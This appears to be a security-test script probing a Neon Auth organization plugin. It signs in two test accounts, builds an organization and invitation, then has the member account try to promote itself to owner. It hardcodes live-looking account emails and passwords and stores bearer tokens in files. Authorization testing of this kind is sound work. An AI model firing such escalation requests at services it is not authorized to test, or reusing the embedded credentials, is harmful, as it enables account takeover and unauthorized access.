# -*- coding: utf-8 -*-
"""Neon Auth org 插件:正常流 + 角色越权变异(带速率控制)"""
import http.client, ssl, json, time, uuid

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'
toks = json.load(open('_na_tokens.json'))
NA1_EMAIL = 'libobo1229+na1@gmail.com'
NA1_PASS = 'SecTest!2026pass'
NA2_EMAIL = 'libobo1229+na2@gmail.com'
NA2_PASS = 'SecTest!2026pass2'

def na_req(method, path, body=None, token=None, origin=ORIGIN):
    for _ in range(2):
        try:
            conn = http.client.HTTPSConnection(NA, context=ctx, timeout=25)
            h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
            if origin:
                h['Origin'] = origin
            if token:
                h['Authorization'] = 'Bearer ' + token
            conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
            r = conn.getresponse(); raw = r.read()
            st = r.status
            conn.close()
            return st, raw[:600]
        except Exception as e:
            return 0, str(e).encode()[:150]
    return 0, b''

def show(tag, st, raw, n=500):
    print('[%s] -> %d | %s' % (tag, st, raw.decode(errors='replace')[:n]), flush=True)
    time.sleep(0.8)

# 0) na1 重新登录
st, raw = na_req('POST', '/neondb/auth/sign-in/email', {'email': NA1_EMAIL, 'password': NA1_PASS})
show('na1 signin', st, raw)
try:
    tok1 = json.loads(raw).get('token')
except Exception:
    tok1 = None
if not tok1:
    print('FATAL: na1 relogin failed'); raise SystemExit
toks['na1'] = tok1
json.dump(toks, open('_na_tokens.json', 'w'))

# 1) na1 创建 org
slug = 'sec-org-' + uuid.uuid4().hex[:8]
st, raw = na_req('POST', '/neondb/auth/organization/create', {'name': 'sec org na', 'slug': slug}, token=tok1)
show('na1 create org', st, raw)
try:
    org = json.loads(raw)
    org_id = org.get('organization', {}).get('id') or org.get('id')
except Exception:
    org_id = None
print('org_id:', org_id, 'slug:', slug, flush=True)

# 2) na2 视角 org list(应为空)
st, raw = na_req('GET', '/neondb/auth/organization/list', token=toks['na2'])
show('na2 list orgs (before)', st, raw)

# 3) na1 invite na2 as member
st, raw = na_req('POST', '/neondb/auth/organization/invite-member',
                 {'organizationId': org_id, 'email': NA2_EMAIL, 'role': 'member'}, token=tok1)
show('na1 invite na2', st, raw)
try:
    inv = json.loads(raw)
    inv_id = inv.get('invitation', {}).get('id') or inv.get('id')
except Exception:
    inv_id = None
print('inv_id:', inv_id, flush=True)

# 4) na2 accept
st, raw = na_req('POST', '/neondb/auth/organization/accept-invitation', {'invitationId': inv_id}, token=toks['na2'])
show('na2 accept', st, raw)

# 5) na2 list orgs (after)
st, raw = na_req('GET', '/neondb/auth/organization/list', token=toks['na2'])
show('na2 list orgs (after)', st, raw)

# 6) 变异:na2(member)把自己 role 提为 owner
st, raw = na_req('POST', '/neondb/auth/organization/update-member-role',
                 {'organizationId': org_id, 'memberId': toks.get('na2_uid'), 'role': 'owner'}, token=toks['na2'])
show('na2 self-promote (no uid)', st, raw)

print('\nDONE org_id=%s inv=%s' % (org_id, inv_id), flush=True)
json.dump({'org_id': org_id, 'slug': slug, 'inv_id': inv_id}, open('_na_orgctx.json', 'w'))
